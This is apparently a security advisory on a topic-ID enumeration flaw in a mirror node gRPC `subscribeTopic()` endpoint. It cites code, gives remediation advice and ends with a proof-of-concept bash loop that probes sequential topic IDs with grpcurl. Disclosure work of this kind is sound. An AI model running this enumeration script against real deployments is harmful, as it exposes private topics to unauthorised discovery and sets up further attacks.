### Title
Topic ID Enumeration via Differential gRPC Error Response in `subscribeTopic()`

### Summary
The `subscribeTopic()` endpoint in `ConsensusController` requires no authentication and returns a distinguishable `NOT_FOUND` gRPC status for non-existent topic IDs versus an open/completing stream for existing topics. An unprivileged external attacker can exploit this behavioral difference to enumerate all valid topic IDs on the mirror node by probing sequential numeric IDs.

### Finding Description

**Code path:**

1. `ConsensusController.subscribeTopic()` — no authentication or authorization check of any kind: [1](#0-0) 

2. The call chain reaches `TopicMessageServiceImpl.topicExists()`, which performs a DB lookup and, when `checkTopicExists=true` (the **default**), throws `EntityNotFoundException` for any topic ID not found in the entity table: [2](#0-1) 

3. `ProtoUtil.toStatusRuntimeException()` maps `EntityNotFoundException` to gRPC `Status.NOT_FOUND`, while all other non-error paths (existing topic, no messages) result in a normally completing or open stream: [3](#0-2) 

4. The default value of `checkTopicExists` is `true`, making this the production behavior: [4](#0-3) 

**Root cause:** The service intentionally distinguishes between "topic does not exist" (`NOT_FOUND`) and "topic exists but has no messages" (stream open/completes normally). There is no authentication gate, no rate limiting enforced at the controller level, and no response normalization to prevent this behavioral difference from being observed externally.

**Exploit flow:**
- Attacker sends `subscribeTopic({topicID: {topicNum: N}, consensusEndTime: <past timestamp>})` for N = 1, 2, 3, …
- If topic N does **not** exist → gRPC `NOT_FOUND` error returned immediately
- If topic N **exists** (even with zero messages) → stream completes normally (empty) because `endTime` is in the past, triggering `pastEndTime` completion
- By observing which IDs return `NOT_FOUND` vs. normal completion, the attacker builds a complete map of all existing topic IDs

The test suite itself confirms this exact behavioral split: [5](#0-4) [6](#0-5) 

### Impact Explanation
An attacker can enumerate the complete set of valid HCS topic IDs without any credentials. This leaks the existence of private/internal topics that operators may not intend to be discoverable, enables targeted follow-on attacks (e.g., subscribing to specific topics to harvest messages), and exposes organizational topology (e.g., which topics are active). Severity is medium-to-high for deployments where topic IDs are treated as non-public.

### Likelihood Explanation
The gRPC port (default 5600) is typically internet-exposed for mirror node deployments. No credentials, tokens, or prior knowledge are required. Topic IDs are sequential 64-bit integers starting from low values, making a full scan trivial with a simple loop. The scan can be parallelized and completed in minutes. The `grpcurl` tool (documented in the project's own README) makes this accessible to any attacker: [7](#0-6) 

### Recommendation
1. **Normalize error responses:** Return the same gRPC status (e.g., `NOT_FOUND` or an open/empty stream) for both non-existent and existing-but-empty topics, removing the observable difference.
2. **Rate-limit unauthenticated callers** at the gRPC server or ingress layer to make bulk enumeration impractical.
3. **Require authentication** for `subscribeTopic()` if topic IDs are considered sensitive in the deployment.
4. Alternatively, set `checkTopicExists=false` in deployments where enumeration is a concern — this causes non-existent topics to behave identically to empty topics (open stream, no error), eliminating the oracle. [8](#0-7) 

### Proof of Concept

```bash
# Existing topic (returns empty stream, exits 0):
grpcurl -plaintext \
  -d '{"topicID": {"topicNum": 1}, "consensusStartTime": {"seconds": 0}, "consensusEndTime": {"seconds": 1}}' \
  <mirror-node-host>:5600 \
  com.hedera.mirror.api.proto.ConsensusService/subscribeTopic
# Output: (empty, stream completes normally)

# Non-existent topic (returns NOT_FOUND error):
grpcurl -plaintext \
  -d '{"topicID": {"topicNum": 99999999}, "consensusStartTime": {"seconds": 0}, "consensusEndTime": {"seconds": 1}}' \
  <mirror-node-host>:5600 \
  com.hedera.mirror.api.proto.ConsensusService/subscribeTopic
# Output: ERROR: Code: NotFound, Message: 0.0.99999999 does not exist

# Enumeration loop (bash):
for i in $(seq 1 10000); do
  result=$(grpcurl -plaintext \
    -d "{\"topicID\": {\"topicNum\": $i}, \"consensusEndTime\": {\"seconds\": 1}}" \
    <host>:5600 com.hedera.mirror.api.proto.ConsensusService/subscribeTopic 2>&1)
  if ! echo "$result" | grep -q "NotFound"; then
    echo "Topic $i EXISTS"
  fi
done
```

### Citations

**File:** grpc/src/main/java/org/hiero/mirror/grpc/controller/ConsensusController.java (L43-48)
```java
    public void subscribeTopic(ConsensusTopicQuery request, StreamObserver<ConsensusTopicResponse> responseObserver) {
        final var disposable = Mono.fromCallable(() -> toFilter(request))
                .flatMapMany(topicMessageService::subscribeTopic)
                .map(this::toResponse)
                .onErrorMap(ProtoUtil::toStatusRuntimeException)
                .subscribe(responseObserver::onNext, responseObserver::onError, responseObserver::onCompleted);
```

**File:** grpc/src/main/java/org/hiero/mirror/grpc/service/TopicMessageServiceImpl.java (L94-106)
```java
    private Mono<?> topicExists(TopicMessageFilter filter) {
        var topicId = filter.getTopicId();
        return Mono.justOrEmpty(entityRepository.findById(topicId.getId()))
                .switchIfEmpty(
                        grpcProperties.isCheckTopicExists()
                                ? Mono.error(new EntityNotFoundException(topicId))
                                : Mono.just(Entity.builder()
                                        .memo("")
                                        .type(EntityType.TOPIC)
                                        .build()))
                .filter(e -> e.getType() == EntityType.TOPIC)
                .switchIfEmpty(Mono.error(new IllegalArgumentException("Not a valid topic")));
    }
```

**File:** grpc/src/main/java/org/hiero/mirror/grpc/util/ProtoUtil.java (L51-52)
```java
        } else if (t instanceof EntityNotFoundException) {
            return clientError(t, Status.NOT_FOUND, t.getMessage());
```

**File:** grpc/src/main/java/org/hiero/mirror/grpc/GrpcProperties.java (L19-19)
```java
    private boolean checkTopicExists = true;
```

**File:** grpc/src/test/java/org/hiero/mirror/grpc/service/TopicMessageServiceTest.java (L122-129)
```java
    void topicNotFound() {
        var filter = TopicMessageFilter.builder().topicId(EntityId.of(999L)).build();

        StepVerifier.withVirtualTime(() -> topicMessageService.subscribeTopic(filter))
                .thenAwait(WAIT)
                .expectError(EntityNotFoundException.class)
                .verify(WAIT);
    }
```

**File:** grpc/src/test/java/org/hiero/mirror/grpc/service/TopicMessageServiceTest.java (L157-165)
```java
    void noMessages() {
        var filter = TopicMessageFilter.builder().topicId(TOPIC_ID).build();

        StepVerifier.withVirtualTime(() -> topicMessageService.subscribeTopic(filter))
                .thenAwait(WAIT)
                .expectNextCount(0L)
                .thenCancel()
                .verify(WAIT);
    }
```

**File:** docs/grpc/README.md (L16-16)
```markdown
`grpcurl -plaintext -d '{"topicID": {"topicNum": 41110}, "limit": 0}' localhost:5600 com.hedera.mirror.api.proto.ConsensusService/subscribeTopic`
```
